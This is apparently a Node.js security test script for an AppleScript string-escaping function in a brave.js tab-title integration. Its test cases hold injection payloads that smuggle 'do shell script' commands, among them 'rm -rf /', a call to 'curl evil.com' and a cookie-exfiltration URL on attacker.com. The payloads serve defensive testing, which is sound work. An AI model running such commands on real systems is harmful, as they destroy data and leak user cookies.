#!/usr/bin/env node

// Security Patch Test Script for brave.js
// Tests the escapeAppleScriptString() function against various injection attempts
// This is a portable Node.js version for testing the logic

// Copy the escape function from brave.js
function escapeAppleScriptString(str) {
    if (typeof str !== 'string') {
        str = String(str);
    }

    return str
        .replace(/\\/g, '\\\\')     // Backslashes must be escaped first
        .replace(/"/g, '\\"')        // Double quotes
        .replace(/\n/g, '\\n')       // Newlines
        .replace(/\r/g, '\\r')       // Carriage returns
        .replace(/\t/g, '\\t');      // Tabs
}

// Test cases: malicious inputs that should be neutralized
const testCases = [
    {
        name: "Double quote injection",
        input: 'Test" & do shell script "say hacked" & "',
        shouldContain: '\\"',
        description: "Attempt to break out of string and execute shell command"
    },
    {
        name: "Newline injection",
        input: 'Line1\ndo shell script "rm -rf /"',
        shouldContain: '\\n',
        description: "Attempt to inject new AppleScript line"
    },
    {
        name: "Backslash escape bypass",
        input: 'Test\\" & do shell script "curl evil.com" & "',
        shouldContain: '\\\\',
        description: "Attempt to use backslash to bypass quote escaping"
    },
    {
        name: "Tab injection",
        input: 'Before\tAfter',
        shouldContain: '\\t',
        description: "Tab characters should be escaped"
    },
    {
        name: "Carriage return injection",
        input: 'Line1\rMalicious command',
        shouldContain: '\\r',
        description: "Carriage returns should be escaped"
    },
    {
        name: "Combined attack",
        input: 'Tab\ttitle"\ndo shell script "curl http://attacker.com/?cookie=" & document.cookie',
        shouldContain: '\\n',
        description: "Multiple escape sequences combined"
    },
    {
        name: "Normal text",
        input: 'Gmail - Inbox (3 unread)',
        expectedOutput: 'Gmail - Inbox (3 unread)',
        description: "Normal tab titles should not have unnecessary escaping"
    },
    {
        name: "URL with special chars",
        input: 'https://example.com/path?q="value"',
        shouldContain: '\\"',
        description: "URLs with quotes should be escaped"
    }
];

// Run tests
console.log('\n=== Security Patch Test Suite ===\n');

let passed = 0;
let failed = 0;

testCases.forEach(test => {
    const escaped = escapeAppleScriptString(test.input);

    console.log(`Test: ${test.name}`);
    console.log(`  Input:       "${test.input}"`);
    console.log(`  Escaped:     "${escaped}"`);
    console.log(`  Description: ${test.description}`);

    let testPassed = false;

    if (test.shouldContain) {
        if (escaped.includes(test.shouldContain)) {
            console.log(`  ✓ PASS - Contains expected escape sequence`);
            testPassed = true;
        } else {
            console.log(`  ✗ FAIL - Missing expected escape sequence: ${test.shouldContain}`);
        }
    }

    if (test.expectedOutput) {
        if (escaped === test.expectedOutput) {
            console.log(`  ✓ PASS - Output matches expected`);
            testPassed = true;
        } else {
            console.log(`  ✗ FAIL - Output doesn't match expected`);
        }
    }

    if (testPassed) {
        passed++;
    } else {
        failed++;
    }

    console.log('');
});

console.log(`\n=== Test Summary ===`);
console.log(`Passed: ${passed}/${testCases.length}`);
console.log(`Failed: ${failed}/${testCases.length}`);

if (failed > 0) {
    console.log('\n⚠️  Some tests failed - security patch may be incomplete');
    process.exit(1);
} else {
    console.log('\n✓ All tests passed - security patch is working correctly');
    process.exit(0);
}
